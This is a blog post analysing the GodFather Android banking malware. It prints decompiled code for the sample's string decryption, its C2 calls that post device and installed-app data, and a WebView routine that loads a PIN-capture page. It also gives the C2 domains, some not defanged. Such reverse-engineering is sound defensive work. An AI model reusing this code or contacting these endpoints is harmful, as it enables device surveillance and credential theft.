List of quick reference of function                 Function Name       Description                       cirrofilum.effluvias       Decipher Strings                 Sandrakottos       Write data inside the SharedPreference                 bedamned       Retrive data from SharedPreference                 champaka       Generate random string                 undissuadably       Use OkHttp to mke a request and then process the http response and save it in the sharepreference                 hagiography       Decode a string into Base64                 Uriiah       Deciphering with blowfish, SecretKeySpec “ABC”                 samariums       Takes a string in b64 and decoding it with an algorithm                 hexammine       Send data to a remote server                 rarefeatured       Prepares to send a request http                 gnarliness       Takes a string in input, converts it to a byte array using UTF-8 encoding and then econdes the byte array in Base64, return the string as result                 trochanteric       Converts an array of bytes into a hexadecimal string                 crakow       Ensure that the lenght of string “s” is a multiple of 16 by adding null characters to the end of the string if necessary                 Predicator       Function where an IV (sulphuric) is initialized using a fixed sequence of hexadecimal characters (“fedcba9876543210”). A secret key (potlatching) is created for the AES algorighm using a fix sequence of hexadecimal characters (“0123456789abcdef”).                 Spellican       Executes an Http Get request to a specified URL, parses the HTML response to find a specific metatag and then stores the contents of that tag in the Android SharedPreferences                 Malacostraca       Function that exectues ab Http Post request with certain parameters and URL, using methods to support for Recover values and build demand                 Abourezk       Function that checks whether the app has permission to ignore battery optimization and, if it does not, request that permission. Once permission is obtained, it opens a specific URL in the chrome browser                 JJ       Function that determines a code based on the manufacturer and model of the Android device it is running on, and then uses the Sandrakottos method of the Tamarix class to send this code along with the “device” key                 speculated       Function that checks whether the device is locked. If it is not, it initiates a periodic action that checks a specific condition in the shared preferences and, if satisfied, cancels the timer and logs the event.                 untraffickable       Function that primarily handles the display of a Web page in a WebView, with specific configurations based on values obtained from methods in other classes (Tamarix and cirrofilum).                 Osnabruck       Function that returns a string containing the package names of the non-system applications installed on the Android device and writes this info to the sharedpreferences                 supersincerity       The function configures various parameters in the context of the application based on default values and the default language of the device.                 Champaka       Creates a random string used for “ky” of sharedpreferences           Shared Preference Unmask  The following is a version of app.xml with an explanation of the main fields and the functions that go into interacting with them.  https://github.com/phemt91/GodFather_String/blob/main/Shared%20Preference%20Details">







  <meta property="article:published_time" content="2024-12-10T00:00:00+00:00">






<link rel="canonical" href="https://ph3mt.github.io//blog/2024/12/10/godfather-android-analysis.html">












<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Ph3mt Blog Feed">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script type="text/javascript">
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
  
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/redBeaver.webp" alt="Ph3mt Blog"></a>
        
        <a class="site-title" href="/">
          Ph3mt Blog
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a
                href="/"
                
                
              >Home</a>
            </li><li class="masthead__menu-item">
              <a
                href="/blog/"
                
                
              >Blog</a>
            </li><li class="masthead__menu-item">
              <a
                href="/about/"
                
                
              >About</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="https://ph3mt.github.io//" itemprop="url"></a>
    </h3>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="GodFather Android Malware Analysis">
    <meta itemprop="description" content="GodFather is an Android malware that was first identified in mid 2023 and quickly attracted the attention of security experts because of its advanced capabilities and modular structure.Its design highlights a significant evolution from its predecessors, exploiting sophisticated techniques to circumvent security measures and infect Android devices.In this article, we will explore how this version of the malware communicates with the C2 server, a critical component that allows attackers to manage the malware in real time and receive stolen data. We will also analyze GodFather’s use of Shared Preferences to store important data locally on the infected device, making it more difficult to detect and delete the collected information.APK OverviewLooking for the SHA-256 of the apk on VirusTotal, we immediately notice that it is already reported as malicious by several security vendors.The application bundle contains several files, the app.xml file contained in the shared_prefs looks interesting (it will be explained later).The domain (which will be explained later in the article) also turns out to be malicious.New Version of GodFatherThe first thing one notices upon examining the apk is the absence of an anti-emulator check unlike the samples analyzed by muha2xmad and group-ib.Step1 : Encrypted stringsThe strings in the application appear to be encrypted, in fact in the following image you can see some of the encrypted strings used by the malware.The class that deals with decrypt these strings is effluvias.![Figure 5 - Effluvias Class](/assets/images/2024-12-09-godfather-android-analysis/img5.pngThis function decrypts a base64 text using the AES algorithm in CBC mode with PKCS5 padding.Using JAVA, it is possible to reproduce the reverse mechanism to decipher the strings in the apk. Below is the code used to decipher the strings.import java.util.Base64;import java.util.Arrays;import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.nio.charset.StandardCharsets; public class DecryptionExample {        public static void main(String[] args) {        // Check args        if (args.length == 0) {            System.out.println(&quot;Inserisci il testo cifrato.&quot;);            System.exit(1);        }         String encryptedText = args[0];         String decryptedText = effluvias(encryptedText);                if (decryptedText != null) {            System.out.println(&quot;Decrypted text: &quot; + decryptedText);        } else {            System.out.println(&quot;Failed to decrypt text&quot;);        }    }     public static String effluvias(String ciphertext) {        try {            byte[] cipherbytes = Base64.getDecoder().decode(ciphertext);            byte[] initVector = Arrays.copyOfRange(cipherbytes, 0, 16);            byte[] messagebytes = Arrays.copyOfRange(cipherbytes, 16, cipherbytes.length);            IvParameterSpec iv = new IvParameterSpec(initVector);            SecretKeySpec skeySpec = new SecretKeySpec(&quot;B9M80O2RAK1VRJNV&quot;.getBytes(StandardCharsets.UTF_8), &quot;AES&quot;);            Cipher cipher = Cipher.getInstance(&quot;AES/CBC/PKCS5PADDING&quot;);            cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);            byte[] byte_array = cipher.doFinal(messagebytes);            return new String(byte_array, StandardCharsets.UTF_8);        } catch (Exception ex) {            ex.printStackTrace();            return null;        }    }}With the script it was possible create a full list of Encrypted and Decrypted String, https://github.com/phemt91/GodFather_String.gitStep2 : C2 CommunicationHaving installed the apk in the emulator, it was possible to start observing its behavior. Regarding network calls, we can see an attempt to connect to the first  in the image below:Examining the code we find references to it:Using the script to decipher the strings in fact we find that:o7lGWUU/28+5RpweyMuUGihsbHNkfHAHwgyycKpQfBmF6MkVSa58Dvr6WU6eFxLJ:https://t[.]me/famokorapisoramThe string also appears to be encrypted, plus we find that this particular string is also present in the Shared Preference:&lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;Continuing the analysis we find that:Contextualizing them:HagiographyThe function takes a Base64-encoded string, decodes it into a byte array, assigns the decoded byte array to a global variable called cremosin, and returns the decoded string.    public static String hagiography(String c) {        cremosin = new byte[0];        byte[] decode = Base64.decode(c.getBytes(StandardCharsets.UTF_8), 0);        cremosin = decode;        return new String(decode);    }UriiahThe function is designed to encrypt a string s using a symmetric encryption algorithm (presumably Blowfish) with a secret key set “ABC”public static String Uriiah(String s) {        String effluvias = (&quot;Blowfish&quot;);        try {            return samariums(s, new SecretKeySpec((&quot;ABC&quot;).getBytes(), effluvias), Cipher.getInstance(effluvias));        } catch (Exception e) {            return HttpUrl.FRAGMENT_ENCODE_SET;        }    }SamariumsThis function takes a Base64-encoded string, decrypt it using a symmetric encryption algorithm with a secret key and a specific IV, returning the decrypted string.public static String samariums(String s, SecretKeySpec sec, Cipher c) throws InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {        try {            byte[] val = Base64.decode(s, 0);            c.init(2, sec, new IvParameterSpec((&quot;abcdefgh&quot;).getBytes()));            return new String(c.doFinal(val));        } catch (Exception e) {            return HttpUrl.FRAGMENT_ENCODE_SET;        }    }Starting with this information, it was possible to create a script that would allow us to decipher the string:import javax.crypto.Cipher;import javax.crypto.spec.IvParameterSpec;import javax.crypto.spec.SecretKeySpec;import java.nio.charset.StandardCharsets;import java.util.Base64; public class DecryptionScript {     public static void main(String[] args) {        String encryptedString = &quot;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&quot;;        String decryptedString = decrypt(encryptedString);        System.out.println(&quot;Decrypted String: &quot; + decryptedString);    }     public static String decrypt(String encryptedString) {        try {            String decrypted = Uriiah(encryptedString);            return decrypted;        } catch (Exception e) {            e.printStackTrace();            return null;        }    }     public static String Uriiah(String s) {        String effluvias = AnnotationHttp.effluvias(&quot;Blowfish&quot;);        try {            return samariums(s, new SecretKeySpec(AnnotationHttp.effluvias(&quot;ABC&quot;).getBytes(), effluvias), Cipher.getInstance(effluvias));        } catch (Exception e) {            e.printStackTrace();            return null;        }    } public static String samariums(String s, SecretKeySpec sec, Cipher c) throws Exception {    byte[] val = Base64.getDecoder().decode(s);    c.init(Cipher.DECRYPT_MODE, sec);    return new String(c.doFinal(val), StandardCharsets.UTF_8);}     // Dummy class for AnnotationHttp    static class AnnotationHttp {        public static String effluvias(String s) {            // Dummy implementation            return s;        }    }}It returns the following url:https://yukoramparata[.]top/zamra/aaa/Analyzing the endpoint on VirusTotal it was found to be malicious:Step3 : Shared Preference and Talking with C2When the application starts, a file called app.xml is created inside the shared preferences, containing several pieces of information:&lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39; standalone=&#39;yes&#39; ?&gt; &lt;map&gt;     &lt;string name=&quot;acb&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;aox&quot;&gt;UGxheSBTdG9yZQ&lt;/string&gt;     &lt;string name=&quot;sy2&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;notification&quot;&gt;UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiB0byB1c2UgdGhlIGFwcGxpY2F0aW9uLg&lt;/string&gt;     &lt;string name=&quot;btck&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;onb2&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;tag&quot;&gt;MDQwMUVO&lt;/string&gt;     &lt;string name=&quot;giflink&quot;&gt;aHR0cHM6Ly9zNS5naWZ5dS5jb20vaW1hZ2VzL1M4QWg2LmdpZg&lt;/string&gt;     &lt;string name=&quot;opc&quot;&gt;0&lt;/string&gt;     &lt;string name=&quot;messagex&quot;&gt;QSBuZXcgdmVyc2lvbiBvZiBvdXIgYXBwbGljYXRpb24gaXMgYXZhaWxhYmxlLiBUbyB1cGRhdGUsIGdvIHRvIFBsYXkgU3RvcmUu&lt;/string&gt;     &lt;string name=&quot;oph&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;cdm2&quot;&gt;reee&lt;/string&gt;     &lt;string name=&quot;alt&quot;&gt;com.melting.mantaught|||&lt;/string&gt;     &lt;string name=&quot;opi&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;ull1&quot;&gt;Rm9yY2Ugc3RvcA&lt;/string&gt;     &lt;string name=&quot;ull2&quot;&gt;dG8gcmVtb3Zl&lt;/string&gt;     &lt;string name=&quot;lowbattery&quot;&gt;TG93IEJhdHRlcnk&lt;/string&gt;     &lt;string name=&quot;xau&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;cdm&quot;&gt;reee&lt;/string&gt;     &lt;string name=&quot;opo&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;toast&quot;&gt;UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiBmb3IgdGhlIGFwcGxpY2F0aW9uIHRvIHJ1bi4&lt;/string&gt;     &lt;string name=&quot;dsd&quot;&gt;none&lt;/string&gt;     &lt;string name=&quot;boa&quot;&gt;QWxsb3c&lt;/string&gt;     &lt;string name=&quot;btry&quot;&gt;0&lt;/string&gt;     &lt;string name=&quot;device&quot;&gt;2&lt;/string&gt;     &lt;string name=&quot;accs&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;psd&quot;&gt;falsefalse&lt;/string&gt;     &lt;string name=&quot;allow&quot;&gt;QWxsb3c&lt;/string&gt;     &lt;string name=&quot;rbt&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;fss&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;aduration&quot;&gt;1500&lt;/string&gt;     &lt;string name=&quot;locale&quot;&gt;en&lt;/string&gt;     &lt;string name=&quot;sb&quot;&gt;0&lt;/string&gt;     &lt;string name=&quot;duration&quot;&gt;500&lt;/string&gt;     &lt;string name=&quot;titlex&quot;&gt;SW5mb3JtYXRpb24&lt;/string&gt;     &lt;string name=&quot;bs&quot;&gt;0&lt;/string&gt;    &lt;string name=&quot;smm&quot;&gt;13 A50&lt;/string&gt;     &lt;string name=&quot;forwading&quot;&gt;Y29tLmxtci5sZm0&lt;/string&gt;     &lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;     &lt;string name=&quot;ka&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;logsender&quot;&gt;0&lt;/string&gt;     &lt;string name=&quot;onb&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;restart&quot;&gt;cmVzdGFydA&lt;/string&gt;     &lt;string name=&quot;ullh&quot;&gt;Rk9SQ0UgU1RPUA&lt;/string&gt;     &lt;string name=&quot;sy&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;infobig&quot;&gt;UGxlYXNlIGdyYW50IHRoZSBwZXJtaXNzaW9uIHNob3duIGFib3ZlIGZvciB0aGUgYXBwbGljYXRpb24gdG8gcnVuLg&lt;/string&gt;     &lt;string name=&quot;again&quot;&gt;UGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4&lt;/string&gt;     &lt;string name=&quot;ntr&quot;&gt;true&lt;/string&gt;     &lt;string name=&quot;ullp&quot;&gt;Rm9yY2Ugc3RvcA&lt;/string&gt;     &lt;string name=&quot;ky&quot;&gt;0hh2fpkr5zt72&lt;/string&gt;     &lt;string name=&quot;permistoast&quot;&gt;WW91IGNhbm5vdCB1c2UgdGhlIGFwcGxpY2F0aW9uIHdpdGhvdXQgZ2l2aW5nIHRoZSBuZWNlc3NhcnkgcGVybWlzc2lvbi4&lt;/string&gt;     &lt;string name=&quot;aso&quot;&gt;false&lt;/string&gt;     &lt;string name=&quot;pl&quot;&gt;0&lt;/string&gt; &lt;/map&gt; Analyzing the wide variety of data, a question was asked: What are these strings? What are they used for?The main functions involved in reading and writing Shared Preference are Bedamend and Sandrakottos:BedamnedThe function retrives data from SharedPreference: Opens the sharedpreference called “app” (app.xml) and return the string associated with key n from the SharedPreferences.If the key does not exist, it returns a default value.   public static String bedamned(Context context, String n) {         SharedPreferences s = context.getSharedPreferences((&quot;app&quot;);         return s.getString(n, HttpUrl.FRAGMENT_ENCODE_SET);     } SandrakottosThe function writes data to shared preference, inserts the key-value paur (n,p) into the SharedPreferences     public static void Sandrakottos(Context context, String n, String p) {         SharedPreferences s = context.getSharedPreferences((&quot;app&quot;), 0);         SharedPreferences.Editor e = s.edit();         e.putString(n, p);         e.apply();     } Having found the function that read and write the share preferences, it was possibile to proceed to the examination of the main functions that write and read data from the shared Preferences:ChampakaThe function generates a random string, which will then be used as the identifier of the device on which the malware is installed, to communicate with the c2 (we will see in the appropriate section).The function take the length of the string “a” as parameter.The created string will contain numbers from 0 to 9 and lowercase letters from a to z without w and x.   public static String champaka(int l) {        String a = (&quot;0123456789&quot;)+(&quot;abcdefghijklmpqrstuvyz&quot;).toLowerCase();        StringBuilder s = new StringBuilder(l);        for (int i = 0; i &lt; l; i++) {            int in = (int) (a.length() * Math.random());            s.append(a.charAt(in));        }        return s.toString();    }UndissuadablyIt Initializes an OkHttpClient  object with different timeouts, constructs a FormBody using the parameters provided in the HashMap. Creates and sends HTTP POST request with the parameters.If the response is valid and contains the string “Injection”,it  processes the response further, splits the result and invokes several functions, some of which appears to store values in SharedPreferences. Then it stores the result in the “obtainal” key.public static String undissuadably(final Context context, String url, HashMap&lt;String, String&gt; params) {    try {        fiddlebow = new OkHttpClient();        OkHttpClient.Builder builder = new OkHttpClient.Builder();        TimeUnit timeUnit = TimeUnit.SECONDS;        fiddlebow = builder            .connectTimeout(50L, timeUnit)            .writeTimeout(50L, timeUnit)            .readTimeout(50L, timeUnit)            .callTimeout(50L, timeUnit)            .build();                final FormBody.Builder builder2 = new FormBody.Builder();        nonstylized = builder2;        Objects.requireNonNull(builder2);                params.forEach(new BiConsumer&lt;String, String&gt;() {            @Override            public void accept(String key, String value) {                builder2.add(key, value);            }        });                spekboom = nonstylized.build();                Request build = new Request.Builder()            .addHeader(&quot;Content-Type&quot;, &quot;text/plain; charset=utf-8&quot;)            .addHeader(&quot;Connection&quot;, &quot;close&quot;)            .url(url)            .post(spekboom)            .build();                Custer = build;                fiddlebow.newCall(build).enqueue(new Callback() {            @Override            public void onFailure(Call call, IOException e) {            }             @Override            public void onResponse(Call call, Response response) throws IOException {                String effluvias = &quot;cn&quot;;                if (response.isSuccessful()) {                    try {                        String res = response.body().string();                        veepees.obtainal = res;                        try {                            if (!res.isEmpty()) {                                veepees.obtainal = Tamarix.Uriiah(res);                            }                        } catch (Exception e) {                        }                        if (!Tamarix.bedamned(context, effluvias).contains(veepees.obtainal)) {                            if (veepees.obtainal.contains(&quot;Injection&quot;)) {                                String[] split = veepees.obtainal.trim().split(&quot;:&quot;);                                veepees.tautologys = split;                                try {                                    rawedged.runtiest(context, split[8]);                                } catch (Exception e2) {                                }                                try {                                    rawedged.reexpressing(context, veepees.tautologys[11]);                                } catch (Exception e3) {                                }                                try {                                    Tamarix.Sandrakottos(context, &quot;dsd&quot;, veepees.tautologys[13]);                                } catch (Exception e4) {                                }                                try {                                    Context context2 = context;                                    String[] strArr = veepees.tautologys;                                    rawedged.hyperemetic(context2, strArr[14], strArr[15]);                                } catch (Exception e5) {                                }                                try {                                    Tamarix.Sandrakottos(context, &quot;psd&quot;, veepees.tautologys[22]);                                } catch (Exception e6) {                                }                                try {                                    Besant.sublibrarianship(context, veepees.tautologys[21]);                                } catch (Exception e7) {                                                              }                                Tamarix.Sandrakottos(context, &quot;is&quot;, veepees.tautologys[1]);                            }                            Tamarix.Sandrakottos(context, effluvias, res);                        }                    } catch (Exception e8) {                                     }                }            }        });        return HttpUrl.FRAGMENT_ENCODE_SET;    } catch (Exception e) {        return HttpUrl.FRAGMENT_ENCODE_SET;    }}SpellicanThis function creates an OkHttpClient.Builder. It configures the timeouts for connect, write, read, and total call to 50 seconds each.Convert the response body to a string using a regex to search for a specific meta tag with property=”og:description” and capture the contents of the tag.For each occurrence found by the regex, call the Sandrakottos method to save the content in the SharedPreferences under the key “min”. Which, in fact, turns out to be the C2 string analyzed earlier.public static void spellican(String url, Context context) throws IOException {        OkHttpClient.Builder builder = new OkHttpClient.Builder();        TimeUnit timeUnit = TimeUnit.SECONDS;        OkHttpClient client = builder.connectTimeout(50L, timeUnit).writeTimeout(50L, timeUnit).readTimeout(50L, timeUnit).callTimeout(50L, timeUnit).build();        Request request = new Request.Builder().url(url).addHeader((&quot;User-Agent&quot;), (&quot;Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36&quot;)).build();        try {            Response response = client.newCall(request).execute();            if (!response.isSuccessful()) {                throw new IOException((&quot;Unexpected code&quot;) + response);            }            String tele = response.body().string();            Pattern pattern = Pattern.compile((&#39;&lt;meta property=\&quot;og:description\&quot; content=\&quot;(.*?)\&quot;&gt;&#39;), 32);            Matcher matcher = pattern.matcher(tele);            while (matcher.find()) {                Sandrakottos(context, (&quot;min&quot;), matcher.group(1));            }            response.close();        } catch (IOException e) {            e.printStackTrace();        }    }RarefeaturedThis function prepares and sends an http request.This function is confusing because it uses two variables called effluvias and effluvias2 with values “alt” and “ky” respectively, ( Effluvias is the same name as the function that is used to decipher strings). A URL is constructed by concatenating the result of the Uriiah method applied to the result of the bedamned method with the key “min” and the string “callnew.php”.On the Shared Preference we can see&lt;string name=&quot;min&quot;&gt;zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==&lt;/string&gt;Deciphered with Uriiah function give us:https://yukoramparata.top/zamra/aaa/ , adding the string “callnew.php”: https://yukoramparata[.]top/zamra/aaa/callnew[.]phpThe rarefeatured function appears to prepare and send an HTTP POST request including a set of data retrieved from the SharedPreference    public static void rarefeatured(Context context, String e) {    public static void rarefeatured(Context context, String e) {        String effluvias = (&quot;alt&quot;);        String effluvias2 = (&quot;ky&quot;);        try {            HashMap&lt;String, String&gt; p = new HashMap&lt;&gt;();            p.put(effluvias2, bedamned(context, effluvias2));            p.put((&quot;tg&quot;), hagiography(bedamned(context, (&quot;tag&quot;))));            p.put((&quot;cy&quot;), bedamned(context, (&quot;locale&quot;)));            p.put((&quot;model&quot;), bedamned(context, (&quot;smm&quot;)));            p.put((&quot;nw&quot;), (&quot;true&quot;));            p.put(effluvias, bedamned(context, effluvias));            p.put((&quot;eys&quot;), e);            p.put((&quot;rpn&quot;), bedamned(context, (&quot;psv&quot;)));            veepees.undissuadably(context, Uriiah(bedamned(context, (&quot;min&quot;))) + (&quot;callnew.php&quot;), p);        } catch (Exception e2) {        }    }            alt      com.melting.mantaught              tg      0401EN              cy      en              model      13 A50              nw      true              ky      0hh2fpkr5zt72      Checking the requests from our device proxy:Step4 : Retrieve Shared Preference and Talking with C2The data it sends is all data that this malware retrieves in different ways, specifically:JJThe JJ function collects device information (manufacturer and model) and sends a specific code associated with these details using a call to Tamarix. Sandrakottos. This could be used to keep track of the type of device that is using the app or to send specific information to the app server for device management or profiling.Ex. Using an emulator for analysis is returned the value device 2public static void JJ(Context context) {    String r;    String d = Build.MANUFACTURER + Build.MODEL;     if (d.contains(&quot;HUAWEI&quot;)) {        r = &quot;0&quot;;    } else if (d.contains(&quot;Pixel&quot;)) {        r = &quot;1&quot;;    } else if (d.substring(0, 2).contains(&quot;LG&quot;)) {        r = &quot;3&quot;;    } else if (d.contains(&quot;Xiaomi&quot;)) {        r = &quot;5&quot;;    } else if (d.contains(&quot;OPPO&quot;) || d.contains(&quot;CPH&quot;)) {        r = &quot;4&quot;;    } else {        r = &quot;2&quot;;    }     Tamarix.Sandrakottos(context, &quot;device&quot;, r);UntraffickableIt checks if the device is of a certain type (device equals “4”) via the Tamarix.bedamned.If true, it sets a value of “true” in the context with the key “opi”.Gets the intent and retrieve two values (str and id) passed through the intent. If str is not null or empty, it sets a value “true” in the context with the key “rbt”.Configure a WebView with JavaScript enabled and a specific User-Agent.Extends WebViewClient and handles web page loading events. The method onPagefinished: if the URL contains “STOP”, it performs a series of actions:•   Loads a blank page (About:blank)•   Updates some keys in the context with new values.•   Finish the activity. (finish)•   Extends webChromeClient•   Handles JavaScript Alert (onJsAlert)Otherwise, it checks the device type again and updates the keys in the context with “false” value. This function returns false when the “back” button is pressedpublic class untraffickable extends Activity {    private static String prevailed;     @Override    @SuppressLint({&quot;SetJavaScriptEnabled&quot;})    public void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);    }     @Override    public void onStart() {        super.onStart();        boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;device&quot;)).equals(cirrofilum.effluvias(&quot;4&quot;));        String effluvias = cirrofilum.effluvias(&quot;true&quot;);        if (equals) {            Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;opi&quot;), effluvias);        }        Intent intent = getIntent();        String str = intent.getStringExtra(cirrofilum.effluvias(&quot;str&quot;));        prevailed = intent.getStringExtra(cirrofilum.effluvias(&quot;id&quot;));        if (!str.equals(HttpUrl.FRAGMENT_ENCODE_SET) || str != null) {            Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), effluvias);            WebView wv = new WebView(this);            wv.getSettings().setJavaScriptEnabled(true);            wv.getSettings().setUserAgentString(cirrofilum.effluvias(&quot;Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR12.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36&quot;));            wv.setWebViewClient(new MyWebViewClient());            wv.setWebChromeClient(new MyWebChromeClient());            wv.loadUrl(Tamarix.Uriiah(Tamarix.bedamned(this, cirrofilum.effluvias(&quot;min&quot;))) + cirrofilum.effluvias(&quot;rx/f.php?f=&quot;) + str + cirrofilum.effluvias(&quot;&amp;p=&quot;) + Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;ky&quot;)) + cirrofilum.effluvias(&quot;|&quot;) + Locale.getDefault().getLanguage().toLowerCase());            setContentView(wv);        }    }     public class MyWebViewClient extends WebViewClient {        @Override        public void onPageFinished(WebView view, String url) {            if (url.contains(cirrofilum.effluvias(&quot;STOP&quot;))) {                view.loadUrl(cirrofilum.effluvias(&quot;about:blank&quot;));                Context applicationContext = untraffickable.this.getApplicationContext();                String effluvias = cirrofilum.effluvias(&quot;is&quot;);                String rep = Tamarix.bedamned(applicationContext, effluvias);                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), effluvias, rep.replace(untraffickable.prevailed, HttpUrl.FRAGMENT_ENCODE_SET));                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;opo&quot;), cirrofilum.effluvias(&quot;true&quot;));                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;psv&quot;), cirrofilum.effluvias(&quot;0&quot;));                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), cirrofilum.effluvias(&quot;false&quot;));                untraffickable.this.finish();            }        }         @Override        public boolean shouldOverrideUrlLoading(WebView view, String url) {            return false;        }    }     public class MyWebChromeClient extends WebChromeClient {        @Override        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {            return true;        }    }     @Override    public void onStop() {        super.onStop();        boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias(&quot;device&quot;)).equals(cirrofilum.effluvias(&quot;4&quot;));        String effluvias = cirrofilum.effluvias(&quot;false&quot;);        if (equals) {            Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;opi&quot;), effluvias);        }        Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias(&quot;rbt&quot;), effluvias);    }     @Override    public void onDestroy() {        super.onDestroy();    }     @Override    public boolean onKeyDown(int keyCode, KeyEvent event) {        return false;    }     @Override    public void onBackPressed() {        super.onBackPressed();    }}Analyzing the “construction” of the url will be:Within the method wv.loadrl:wv.loadUrl(    Tamarix.Uriiah(Tamarix.bedamned(this, &quot;min&quot;)) +     &quot;rx/f.php?f=&quot; + str +     &quot;&amp;p=&quot; + Tamarix.bedamned(getApplicationContext(), &quot;ky&quot;) +     &quot;|&quot; + Locale.getDefault().getLanguage().toLowerCase());Tamarix.Uriiah(Tamarix.bedamned(this, “min”)):Uriiah method takes a value obtained from Tamarix.bedamned(this, “min”) and returns a fixed part of the URL.So https://yukoramparata.top/zamra/aaa/“rx/f.php?f=” + str: adds the parameters “f” with the value obtained from the intent (str).“&amp;p=” + Tamarix.bedamned(getApplicationContext(), “ky”): adds the parameter “p” with a value obtained from  Tamarix.bedamned.”|” + Locale.getDefault().getLanguage().toLowerCase(): Adds the device language as a parameter in the URL.The parameters str and id could be generated by speculatd function (in detalis below).Below the code of the speculated function                        Intent dialogIntent = new Intent(ctx, untraffickable.class)                            .putExtra(&quot;str&quot;, &quot;ALL_PIN&quot;)                            .putExtra(&quot;id&quot;, &quot;1500&quot;);The result:https://yukoramparata.top/zamra/aaa/rx/f.php?f=ALL_PIN&amp;p=0hh2fpkr5zt72|enSpeculatedThe function gets an instance of KeyguardManager, it checks whether the device is locked using the isKeyguardLocked() If the device is not locked (locked is false), the function creates a Timer object. It defines an anonymous TimerTask that performs a periodic taskpublic static void speculated(final Context ctx) {    KeyguardManager km = (KeyguardManager) ctx.getSystemService(&quot;keyguard&quot;);    boolean locked = km.isKeyguardLocked();    if (!locked) {        try {            final Timer timerObj = new Timer();            TimerTask timerTask = new 